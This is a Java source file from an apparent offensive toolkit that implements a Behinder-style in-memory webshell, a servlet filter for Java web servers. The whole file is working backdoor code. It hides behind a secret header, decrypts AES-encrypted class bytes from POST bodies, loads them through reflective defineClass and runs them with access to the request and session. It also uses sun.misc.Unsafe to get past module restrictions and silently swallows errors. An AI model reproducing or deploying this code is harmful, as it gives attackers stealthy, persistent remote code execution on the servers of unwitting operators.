package com.ppp.middleware.memshell;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;
import com.ppp.annotation.MemShellType;
import com.ppp.middleware.loader.SpringInterceptorContextLoader;
import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Whoopsunix
 * <p>
 */
@MemShell(MemShell.Filter)
@MemShellFunction(MemShellFunction.Behinder)
@MemShellType(MemShellType.Default)
@JavaClassModifiable({JavaClassModifiable.pass, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
public class FilterBehinder implements InvocationHandler {
    private static String pass;
    private static String lockHeaderKey;
    private static String lockHeaderValue;

    public Object invoke(Object proxy, Method method, Object[] args) {
        if (method.getName().equals("doFilter")) {
            run(args[0], args[1], args[2]);
        }
        return null;
    }

    private void run(Object servletRequest, Object servletResponse, Object filterChain) {
        try {
            addModule();
            String lv = (String) invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
            if (lv == null || !lv.contains(lockHeaderValue)) {
                return;
            }
            String method = (String) invokeMethod(servletRequest, "getMethod", new Class[]{}, new Object[]{});
            if (!method.equalsIgnoreCase("POST"))
                return;
            Object session = invokeMethod(servletRequest, "getSession", new Class[]{}, new Object[]{});
            Map<String, Object> pageContext = new HashMap<String, Object>();
            pageContext.put("session", session);
            pageContext.put("request", servletRequest);
            pageContext.put("response", servletResponse);
            invokeMethod(session, "putValue", new Class[]{String.class, Object.class}, new Object[]{"u", pass});

            Object c = invokeMethod(Class.forName("javax.crypto.Cipher"), null, "getInstance", new Class[]{String.class}, new Object[]{"AES"});
            invokeMethod(c, "init", new Class[]{int.class, Class.forName("java.security.Key")}, new Object[]{2, Class.forName("javax.crypto.spec.SecretKeySpec").getDeclaredConstructor(byte[].class, String.class).newInstance(pass.getBytes(), "AES")});
            Object reader = invokeMethod(servletRequest, "getReader", new Class[]{}, new Object[]{});
            String str = (String) invokeMethod(reader, "readLine", new Class[]{}, new Object[]{});
            byte[] bytes = (byte[]) invokeMethod(c, "doFinal", new Class[]{byte[].class}, new Object[]{base64(str)});

            Class clazz = defClass(bytes);
            clazz.newInstance().equals(pageContext);
        } catch (Throwable e) {

        }
    }

    public static byte[] base64(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) invokeMethod(clazz.getSuperclass(), clazz.newInstance(), "decodeBuffer", new Class[]{String.class}, new Object[]{str});
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = invokeMethod(clazz, null, "getDecoder", new Class[]{}, new Object[]{});
            return (byte[]) invokeMethod(decoder.getClass(), decoder, "decode", new Class[]{String.class}, new Object[]{str});
        }
    }

    public Class defClass(byte[] classBytes) throws Throwable {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defMethod.setAccessible(true);
        return (Class) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        } catch (Exception e) {
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static void addModule() {
        try {
            Class unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) unsafeField.get(null);
            Method method = Class.class.getDeclaredMethod("getModule");
            method.setAccessible(true);
            Object module = method.invoke(Object.class);
            Class cls = FilterBehinder.class;
            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectMethod.setAccessible(true);
            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
        } catch (Exception e) {

        }
    }
}
